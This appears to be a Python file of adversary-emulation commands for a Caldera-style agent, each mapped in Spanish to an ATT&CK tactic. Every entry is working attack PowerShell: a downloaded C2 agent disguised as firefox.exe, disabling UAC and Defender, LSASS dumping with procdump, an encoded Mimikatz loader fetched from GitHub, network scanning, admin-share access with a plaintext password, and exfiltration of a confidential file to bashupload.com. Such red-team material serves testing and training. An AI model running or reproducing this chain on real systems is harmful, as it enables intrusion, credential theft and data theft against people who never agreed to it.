cmd1 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
$server="http://192.168.0.170:8888";
$socket="192.168.0.170:7010";
$contact="tcp";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","manx.go");
$data=$wc.DownloadData($url);
Get-Process | ? {$_.Path -like "C:\Users\Public\firefox.exe"} | stop-process -f -ea $ErrAction;
rm -force "C:\Users\Public\firefox.exe" -ea $ErrAction;
([io.file]::WriteAllBytes("C:\Users\Public\firefox.exe",$data)) | Out-Null;
Start-Process -FilePath C:\Users\Public\firefox.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;''',
        },
        "ability": {
            "tactic": "Persistencia",
            "name": "TCP Reverse Shell",
        }
    }


cmd2 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force''',
        },
        "ability": {
            "tactic": "Escalación de privilegios",
            "name": "UAC bypass registry",
            "technique_name": "Abuse Elevation Control Mechanism",
            "technique_id": "T1548.002"
        }
    }

cmd3 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Set-MpPreference -DisableIntrusionPreventionSystem $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -EnableControlledFolderAccess Disabled;''',
        },
        "ability": {
            "tactic": "Evasión de defensas",
            "name": "Impair Defenses: Disable or Modify Tools",
            "technique_name": "Disable EDR / AV / AMSI",
            "technique_id": "T1562.001"
        }
    }

cmd4 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''$ps_url = "https://download.sysinternals.com/files/Procdump.zip";
$download_folder = "C:\Users\Public\";
$staging_folder = "C:\Users\Public\temp";
Start-BitsTransfer -Source $ps_url -Destination $download_folder;
Expand-Archive -LiteralPath $download_folder"Procdump.zip" -DestinationPath $staging_folder;
$arch=[System.Environment]::Is64BitOperatingSystem;

if ($arch) {
    iex $staging_folder"\procdump64.exe -accepteula -ma lsass.exe" > $env:APPDATA\error.dmp 2>&1;
} else {
    iex $staging_folder"\procdump.exe -accepteula -ma lsass.exe" > $env:APPDATA\error.dmp 2>&1;
}
remove-item $staging_folder -Recurse;''',
        },
        "ability": {
            "tactic": "Acceso a credenciales",
            "name": "Leverage Procdump for lsass memory",
            "technique_name": "OS Credential Dumping: LSASS Memory",
            "technique_id": "T1003.001"
        }
    }


cmd5 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==''',
        },
        "ability": {
            "tactic": "Acceso a credenciales",
            "name": "PowerShell Invoke MimiKats",
            "technique_name": "OS Credential Dumping: LSASS Memory",
            "technique_id": "T1003.001"
        }
    }


cmd6 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Import-Module .\invoke-mimi.ps1;
Invoke-Mimikatz -DumpCreds''',
        },
        "ability": {
            "tactic": "Acceso a credenciales",
            "name": "Powerkatz (Staged)",
            "technique_name": "OS Credential Dumping: LSASS Memory",
            "technique_id": "T1003.001"
        }
    }


cmd7 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''arp -a''',
        },
        "ability": {
            "tactic": "Descubrimiento",
            "name": "Collect ARP details",
            "technique_name": "Remote System Discovery",
            "technique_id": "T1018"
        }
    }


cmd8 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''netstat -anto;
Get-NetTCPConnection''',
        },
        "ability": {
            "tactic": "Descubrimiento",
            "name": "Find System Network Connections",
            "technique_name": "System Network Connections Discovery",
            "technique_id": "T1049"
        }
    }


cmd9 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Import-Module ./basic_scanner.ps1;
$ports = @(22, 53, 80, 445);
Get-NetIPConfiguration | ?{$_.NetAdapter.Status -ne "Disconnected"} | Get-NetIPaddress -AddressFamily IPv4 | %{
    $ipv4 = $_.IPAddress;
    $prefixLength = $_.PrefixLength;
    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;
};''',
        },
        "ability": {
            "tactic": "Descubrimiento",
            "name": "Network Service Scanning",
            "technique_name": "Network Service Scanning",
            "technique_id": "T1046"
        }
    }

cmd10 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''net view \\10.50.10.101 /all''',
        },
        "ability": {
            "tactic": "Movimiento Lateral",
            "name": "View remote shares",
            "technique_name": "Network Share Discovery",
            "technique_id": "T1135"
        }
    }

cmd11 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''net use \\10.50.10.101\c$ /user:administrator 5h0wr00m2025-;''',
        },
        "ability": {
            "tactic": "Movimiento Lateral",
            "name": "Net use",
            "technique_name": "Remote Services: SMB/Windows Admin Shares",
            "technique_id": "T1021.002"
        }
    }

cmd12 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Get-ChildItem C:\Users -Recurse -Include *.txt -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
exit 0;''',
        },
        "ability": {
            "tactic": "Coleccion",
            "name": "Find Files",
            "technique_name": "Data from Local System",
            "technique_id": "T1005"
        }
    }

cmd13 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Get-Content -Path C:\Users\confidential.txt''',
        },
        "ability": {
            "tactic": "Coleccion",
            "name": "Get Content",
            "technique_name": "Get Data content",
            "technique_id": "T1005"
        }
    }

cmd14 = {
        "paw": "ftopmr",
        "executor": {
            "name": 'psh',
            "command": r'''Invoke-WebRequest -Uri https://bashupload.com -Method Post -ContentType multipart/form-data -Body C:\Users\confidential.txt''',
        },
        "ability": {
            "tactic": "Exfiltracion",
            "name": "Exfiltracion",
            "technique_name": "Exfiltration Over C2 Channel",
            "technique_id": "T1041"
        }
    }